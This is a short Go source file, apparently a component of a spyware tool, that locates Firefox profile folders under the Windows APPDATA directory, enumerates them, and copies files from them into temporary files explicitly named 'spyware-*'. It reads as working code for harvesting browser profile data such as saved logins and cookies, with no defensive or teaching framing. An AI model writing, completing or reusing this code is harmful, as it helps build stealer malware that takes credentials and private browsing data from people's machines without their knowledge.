package firefox

import (
	"fmt"
	"io"
	"os"
	"path/filepath"
)

func GetFirefoxUserDataPath() (string, error) {
	appData := os.Getenv("APPDATA")
	if appData == "" {
		return "", fmt.Errorf("APPDATA environment variable not set")
	}
	return filepath.Join(appData, "Mozilla", "Firefox", "Profiles"), nil
}

func GetFirefoxProfilePaths() ([]string, error) {
	userDataPath, err := GetFirefoxUserDataPath()
	if err != nil {
		return nil, err
	}

	var profilePaths []string
	items, err := os.ReadDir(userDataPath)
	if err != nil {
		return nil, fmt.Errorf("failed to read user data directory: %w", err)
	}

	for _, item := range items {
		if item.IsDir() {
			profilePaths = append(profilePaths, filepath.Join(userDataPath, item.Name()))
		}
	}

	return profilePaths, nil
}

func CopyFile(src string) (string, error) {
	dst, err := os.CreateTemp("", "spyware-*")
	if err != nil {
		return "", err
	}
	defer dst.Close()

	srcFile, err := os.Open(src)
	if err != nil {
		return "", err
	}
	defer srcFile.Close()

	_, err = io.Copy(dst, srcFile)
	if err != nil {
		return "", err
	}

	return dst.Name(), nil
}
